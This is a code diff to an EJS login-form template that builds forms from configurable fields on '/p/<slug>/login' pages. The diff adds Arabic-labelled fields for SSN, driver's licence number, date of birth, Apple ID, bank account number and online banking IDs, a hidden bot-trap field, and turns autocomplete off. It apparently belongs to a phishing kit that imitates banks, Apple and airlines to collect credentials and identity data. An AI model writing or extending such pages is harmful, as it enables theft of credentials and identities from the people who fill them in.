@@ -68,17 +68,28 @@
 
   <form method="POST" action="/p/<%= page.slug %>/login">
     <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+    <input type="text" name="_hp" style="display:none" tabindex="-1" autocomplete="off">
+    <% const PLACEHOLDERS = {
+      email: 'البريد الإلكتروني',
+      password: 'كلمة المرور',
+      phone: 'رقم الجوال',
+      username: 'اسم المستخدم',
+      name: 'الاسم',
+      customer_id: 'رقم العميل',
+      online_id: 'هوية الإنترنت',
+      dl_number: 'رقم رخصة القيادة',
+      ssn: 'رقم الضمان الاجتماعي (SSN)',
+      dob: 'تاريخ الميلاد',
+      booking_ref: 'رقم الحجز',
+      last_name: 'اسم العائلة',
+      apple_id: 'Apple ID (البريد الإلكتروني)',
+      account_number: 'رقم الحساب'
+    } %>
     <% pageContent.fields.forEach(f => {
-      const type = f === 'password' ? 'password' : f === 'email' ? 'email' : f === 'phone' ? 'tel' : 'text';
-      const placeholder = {
-        email: 'البريد الإلكتروني',
-        password: 'كلمة المرور',
-        phone: 'رقم الجوال',
-        username: 'اسم المستخدم',
-        name: 'الاسم'
-      }[f] || f;
+      const type = f === 'password' ? 'password' : f === 'email' || f === 'apple_id' ? 'email' : f === 'phone' ? 'tel' : f === 'dob' ? 'date' : 'text';
+      const placeholder = PLACEHOLDERS[f] || f;
     %>
-      <input type="<%= type %>" name="<%= f %>" placeholder="<%= placeholder %>" autocomplete="<%= f === 'password' ? 'current-password' : f %>" required>
+      <input type="<%= type %>" name="<%= f %>" placeholder="<%= placeholder %>" autocomplete="<%= f === 'password' ? 'current-password' : 'off' %>" required>
     <% }) %>
     <button type="submit"><%= pageContent.cta || 'تسجيل الدخول' %></button>
   </form>
